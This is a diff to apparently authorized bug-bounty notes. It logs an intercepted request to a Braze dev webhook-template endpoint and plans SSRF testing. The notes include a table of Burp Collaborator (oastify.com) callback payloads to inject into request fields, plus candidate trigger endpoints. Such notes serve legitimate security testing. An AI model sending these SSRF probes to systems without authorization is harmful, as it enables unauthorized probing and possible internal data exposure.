@@ -581,7 +581,163 @@ The endpoints above are educated guesses based on common patterns. To find the *
 
 ---
 
-## 9. Disclaimer
+## 9. Live Testing Findings — Confirmed Intercepted Requests
+
+This section documents real requests captured during authorized testing via Burp Suite.
+
+---
+
+### Finding #1 — Webhook Template Creation (`webhook_url` parameter)
+
+**Intercepted Request:**
+
+```
+POST /engagement/webhook_templates/undefined?app_group_id=69c8d257629242005dba8746 HTTP/1.1
+Host: bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+
+{
+  "name": "venu",
+  "description": null,
+  "tag_names": [],
+  "webhook_body": "{}",
+  "webhook_body_type": "json",
+  "webhook_method": "POST",
+  "territory_ids": [],
+  "api_identifier": "",
+  "webhook_url": "if1x3ugusgdcn659n48okn054wanyem3.oastify.com",
+  "webhook_headers": {}
+}
+```
+
+**Analysis:**
+
+| Item | Detail |
+|------|--------|
+| **Endpoint** | `POST /engagement/webhook_templates/undefined?app_group_id=69c8d257629242005dba8746` |
+| **Parameter** | `webhook_url` |
+| **Value Sent** | `if1x3ugusgdcn659n48okn054wanyem3.oastify.com` (Burp Collaborator / OAST domain) |
+| **Risk Level** | **Possible** — awaiting Collaborator results (see next steps below) |
+
+**Key Observations from the Request:**
+
+1. **`/undefined` in the path** — The URL path contains `/undefined`, which means the frontend JavaScript is passing an undefined template ID. This is a **new template creation** flow (not editing an existing one). The backend likely ignores or replaces the `undefined` segment.
+
+2. **`webhook_url` accepts arbitrary domains** — The application accepted `if1x3ugusgdcn659n48okn054wanyem3.oastify.com` in the `webhook_url` field without immediately rejecting it as invalid. This is notable because:
+   - There is no `http://` or `https://` scheme prefix — check if the server auto-prepends a scheme.
+   - The domain is clearly not a well-known service — no allowlist is enforced at the form submission level.
+
+3. **`webhook_method: POST`** — The template specifies that the webhook should use HTTP POST. If the server ever sends a test or live webhook, it will make a `POST` request to the Collaborator URL.
+
+4. **`webhook_body: "{}"`** — The webhook body is set to empty JSON. When the webhook fires, the server will send this body to the target URL.
+
+5. **`webhook_headers: {}`** — No custom headers. The server's default headers will be included in any outbound request, potentially leaking internal information (User-Agent, internal tokens, etc.).
+
+---
+
+### Next Steps for This Finding
+
+**Step A — Check Burp Collaborator for interactions:**
+
+1. Go to **Burp → Collaborator** tab.
+2. Click **Poll now**.
+3. Look for any DNS or HTTP interactions from the `oastify.com` subdomain.
+4. **If you see a hit:** Record the details below.
+5. **If no hit yet:** The webhook template was only *saved*, not *triggered*. Proceed to Step B.
+
+**Step B — Trigger the webhook to fire:**
+
+The template has been created but may not have been executed yet. Try these actions to trigger it:
+
+1. **Look for a "Test" or "Send Test" button** on the webhook template page in the UI. This would trigger the server to make an HTTP request to `webhook_url` immediately.
+
+2. **Try sending a test request directly** — look in Burp HTTP history for an endpoint like:
+
+```
+POST /engagement/webhook_templates/{template_id}/test?app_group_id=69c8d257629242005dba8746
+```
+
+or:
+
+```
+POST /engagement/webhook_templates/{template_id}/send_test?app_group_id=69c8d257629242005dba8746
+```
+
+3. **Check if the template got an ID** — The response to your POST should contain the created template's ID. Find that response in HTTP history and note the `id` field. You'll need it for the test endpoint.
+
+**Step C — Fix the URL scheme:**
+
+Your Collaborator URL is missing the `http://` prefix. Resend the request in Repeater with the corrected URL to ensure the server can actually reach it:
+
+```json
+"webhook_url": "https://if1x3ugusgdcn659n48okn054wanyem3.oastify.com"
+```
+
+**Step D — Additional parameters to test in this same request:**
+
+The webhook template endpoint accepts several fields. Try injecting Collaborator URLs into these as well (one at a time, using Repeater):
+
+| Test | Modified Field | Payload |
+|------|---------------|---------|
+| D1 | `webhook_url` | `https://YOUR-ID.oastify.com/ssrf-webhook-url` |
+| D2 | `webhook_body` | `https://YOUR-ID.oastify.com/ssrf-webhook-body` |
+| D3 | `api_identifier` | `https://YOUR-ID.oastify.com/ssrf-api-id` |
+| D4 | `description` | `https://YOUR-ID.oastify.com/ssrf-description` |
+| D5 | `webhook_headers` | `{"Host": "YOUR-ID.oastify.com"}` |
+
+---
+
+### Related Endpoints Discovered from This Request
+
+The intercepted request reveals the actual URL structure the application uses. Based on this, here are the real endpoints to explore:
+
+| # | Method | Endpoint | Action |
+|---|--------|----------|--------|
+| 1 | `GET` | `/engagement/webhook_templates?app_group_id={app_id}` | List all webhook templates |
+| 2 | `POST` | `/engagement/webhook_templates?app_group_id={app_id}` | Create a new webhook template (confirmed) |
+| 3 | `GET` | `/engagement/webhook_templates/{template_id}?app_group_id={app_id}` | Read a specific template |
+| 4 | `PUT` | `/engagement/webhook_templates/{template_id}?app_group_id={app_id}` | Update a template |
+| 5 | `DELETE` | `/engagement/webhook_templates/{template_id}?app_group_id={app_id}` | Delete a template |
+| 6 | `POST` | `/engagement/webhook_templates/{template_id}/test?app_group_id={app_id}` | **Test/trigger** a template (likely fires the webhook) |
+| 7 | `POST` | `/engagement/webhook_templates/{template_id}/send_test?app_group_id={app_id}` | Alternative test endpoint |
+| 8 | `POST` | `/engagement/webhook_templates/{template_id}/preview?app_group_id={app_id}` | Preview the webhook request |
+
+Also explore related engagement endpoints:
+
+| # | Method | Endpoint | Action |
+|---|--------|----------|--------|
+| 9 | `POST` | `/engagement/campaigns?app_group_id={app_id}` | Create a campaign (may reference webhook templates) |
+| 10 | `POST` | `/engagement/canvases?app_group_id={app_id}` | Create a Canvas (may reference webhook templates) |
+| 11 | `GET` | `/engagement/templates_and_media?app_group_id={app_id}` | List all templates/media |
+| 12 | `POST` | `/engagement/email_templates?app_group_id={app_id}` | Email templates (may have URL fields) |
+| 13 | `POST` | `/engagement/content_blocks?app_group_id={app_id}` | Content blocks (may have Connected Content URLs) |
+
+---
+
+### Collaborator Result Recording Template
+
+Fill this in once you check Collaborator:
+
+```
+Collaborator Domain:  if1x3ugusgdcn659n48okn054wanyem3.oastify.com
+Interaction Type:     [ ] DNS only  [ ] HTTP  [ ] None yet
+HTTP Method:          _______________
+Source IP:            _______________
+User-Agent:          _______________
+Request Headers:     _______________
+Timestamp:           _______________
+Latency (from send): _______________
+
+Conclusion:
+  [ ] No interaction — webhook was saved but not triggered
+  [ ] DNS only — server resolved the domain (confirms SSRF)
+  [ ] HTTP hit — server made a full HTTP request (confirms SSRF)
+```
+
+---
+
+## 10. Disclaimer
 
 This analysis is performed under authorized bug bounty testing scope. All findings are based on:
 - URL structure analysis
